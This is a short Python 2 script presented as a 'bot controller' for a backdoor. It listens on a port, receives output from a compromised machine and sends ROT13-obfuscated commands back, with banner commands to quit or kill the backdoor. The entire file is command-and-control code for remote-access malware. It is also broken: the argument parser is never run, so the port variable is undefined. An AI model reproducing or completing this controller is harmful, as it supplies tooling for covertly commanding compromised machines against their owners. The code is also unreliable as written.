import socket
import sys
import argparse

parser=argparse.ArgumentParser()
parser.add_argument('-p','--port',required=True,help='Port to listen on',dest='port')

print "Welcome to your bot controller! \nUse the command 'qu1t' to end your session and 'k1ll' to kill the backdoor\n"

mysocket=socket.socket()
mysocket.bind(("",port))
mysocket.listen(1)

connection,fromaddr = mysocket.accept()
while True:
    request = connection.recv(10240)
    print "from bot: \n" + str(request.decode("rot13"))
    command = raw_input("enter next command: \n").encode("rot13")
    connection.send(command)